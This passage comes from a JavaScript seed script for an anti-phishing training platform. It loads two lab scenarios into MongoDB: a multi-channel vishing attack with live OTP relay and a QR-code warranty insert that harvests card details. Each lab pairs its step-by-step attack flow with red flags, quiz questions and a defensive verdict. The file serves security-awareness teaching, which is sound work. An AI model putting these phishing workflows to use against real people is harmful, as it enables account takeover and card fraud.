                'Step 1: Employee ID + password (caller keeps victim on line and "helps" them through it)',
                'Step 2: MFA OTP sent to real phone — entered on verification page — caller captures it',
                'Step 3: "Verification successful. Your account has been secured." — session cookie handed over',
                'Real-time: Attacker on second device uses credentials + OTP to log in immediately during the call',
            ],
            multiChannel: 'Voice + SMS + Web — three channels used simultaneously to maximize confusion',
            liveRelay: 'Attacker relays OTP in real-time during phone call — timing window is the call duration',
        },
        [
            'Caller ID spoofed to match internal IT number — bypass caller ID-based trust',
            'Fear trigger: "suspicious activity from Bucharest" — creates urgency + anxiety',
            'QR delivered via SMS mid-call — multi-channel attack reduces analytical headspace',
            'Attacker keeps victim on phone while they log in — live relay of OTP',
            'Domain: fintrust-account-verify.com — not fintrust.com',
            'Three simultaneous channels (voice + SMS + web) overwhelm single-source verification',
        ],
        [
            'This attack uses three simultaneous channels: phone, SMS, and web. Explain why multi-channel combination attacks are significantly more effective than single-channel phishing.',
            'The caller\'s ID shows the internal IT helpdesk number. Explain how caller ID spoofing works and why it is not reliable as an authentication mechanism.',
            'The attacker keeps the victim on the phone while logging in. What is the maximum time window the attacker has to use the OTP, and how does maintaining the call extend this window?',
            'What corporate verification procedure would stop this specific attack at the point of the phone call?',
        ],
        [
            'Multi-channel effectiveness: Single-channel attacks (one email) give the victim one data point to evaluate. Multi-channel (call + SMS + web simultaneously) creates cognitive overload — the victim is managing three streams, speaking on the phone, receiving SMS, and browsing simultaneously. The analytical bandwidth for security scrutiny is reduced. The caller also provides "live guidance" for the web steps — removing the victim\'s opportunity to pause and think.\n\nOTP Time Window: TOTP codes are valid for 30 seconds. But SMS OTPs are typically valid for 5–10 minutes. The attacker keeps the victim on the phone for this entire window, ensuring the OTP remains valid when they relay it.',
        ],
        'phishing',
        'VERDICT: Multi-Channel Vishing + QR + OTP Relay Attack — Live Account Takeover During Phone Call. Risk: CRITICAL.\n\nProcedure to Stop It: "Any IT request that asks you to enter your password or OTP must be verified by hanging up and calling the IT helpdesk number published on our intranet — not the number that called you." This single policy eliminates all spoofed-caller-ID social engineering.\n\nRemediation: Reset password + revoke sessions. Investigate accessed resources. Add IT call verification step to security awareness training.'
    ),

    mkLab(
        'QR Phishing - eCommerce QR Package Insert',
        3,
        'Customers who purchased a consumer electronics product from a third-party Amazon marketplace seller find a QR code insert inside the package. The insert promotes a "free extended warranty registration." The QR leads to a cloned warranty portal that harvests card details under the guise of "₹0 warranty activation fee — required for record."',
        {
            type: 'physical_package_insert',
            channel: 'Physical insert inside shipped product package',
            insert_text: '📦 REGISTER YOUR WARRANTY — Get 2 YEARS EXTENDED!\nScan QR below within 30 days of purchase.\nRequired for warranty activation.',
            brand_mimicry: 'Uses scraped brand logos and product images — visually matches real brand',
            distribution: 'Attacker operates as Amazon third-party seller — inserts in all shipments',
        },
        {
            decoded: 'https://warranty-register-pro[.]com/activate',
            format: 'URL',
            deliveryMethod: 'Physical insert in shipped product packaging',
        },
        {
            pageFlow: [
                'GET /activate → Warranty registration page — brand logo, product image, professional design',
                'Step 1: Product serial number, purchase date, name, email, phone',
                'Step 2: "Card required for ₹0 warranty activation — stored for future service calls"',
                'Step 3: Card number, CVV, expiry, billing address collected',
                'POST /register → card data stored — victim gets "Warranty Registered!" confirmation email',
                'Attacker: card used for CNP fraud within 24 hours',
            ],
            formFields: ['serial_number', 'purchase_date', 'name', 'email', 'phone', 'card_number', 'cvv', 'expiry', 'billing_address'],
            socialEngineering: 'Physical delivery context: victim trusts insert because it came IN the box they ordered',
        },
        [
            'Domain: warranty-register-pro.com — not the brand\'s official domain',
            'Physical insert inside genuine purchased package creates very high trust',
            '₹0 charge framing: "no cost" reduces financial alarm even though card is collected',
            'Card "stored for service calls" — plausible excuse for card collection',
            'Confirmation email sent — creates professional impression, victim doesn\'t question it',
            'Amazon marketplace: attacker is a legitimate seller — insert physically placed before shipping',
        ],
        [
            'This insert came inside a genuine product the victim legitimately purchased. Why does the physical delivery context create exceptionally high trust compared to a cold email or social media phishing attempt?',
            'The site requests a card for a "₹0 activation" — no charge will occur today. Explain why this zero-cost framing is psychologically effective at reducing card-submission resistance.',
            'The attacker operated as an Amazon marketplace seller to place inserts in packages. What is the attacker\'s operational cost for this insertion method, and why does it create a more convincing attack than digital distribution?',
            'What technical verification can a security-aware consumer perform before entering card details on any warranty registration page?',
        ],
        [
            'Physical package delivery trust: The victim physically ordered and received a product. The insert arrived WITH the product — in their mind, it is from the seller. This in-context delivery creates the highest trust level attainable in social engineering — the victim\'s guard is down because they initiated the transaction. Cold emails/SMS have no such contextual trust anchor.\n\nVerification steps: (1) Check the warranty domain against the brand\'s official website/manual. (2) No legitimate warranty requires a card for ₹0 activation — warranties are contractual, not card-based. (3) Google the warranty domain name + "scam" or "review" before entering details.',
        ],
        'phishing',
        'VERDICT: In-Package QR — Warranty Fraud Payment Harvest. Risk: HIGH.\n\nTrust Mechanism: Physical insert in genuine purchase creates near-perfect trust context — highest social engineering baseline.\n\nCard Used For: CNP fraud within 24 hours. Billing address enables address-matched CNP.\n\nAmazon Response: Report seller via Amazon Brand Registry abuse form. Report to cybercrime.gov.in. Block card immediately via bank.'
    ),
];

async function seed() {
    const DB = process.env.MONGODB_URI || 'mongodb://localhost:27017/antiphishx';
    await mongoose.connect(DB);
    console.log('✅ Connected to MongoDB\n');

    for (const lab of LABS) {
        await Lab.findOneAndUpdate(
            { title: lab.title },
            lab,
            { upsert: true, new: true, runValidators: false }
        );
        console.log(`  ✔ [INT ${lab.difficulty}/10] ${lab.title}`);
    }

    const total = await Lab.countDocuments();
    console.log(`\n✅ Done — ${LABS.length} QR Code Intermediate labs upserted.`);
    console.log(`   🗄️  Total labs in DB: ${total}`);
    process.exit(0);
}

seed().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
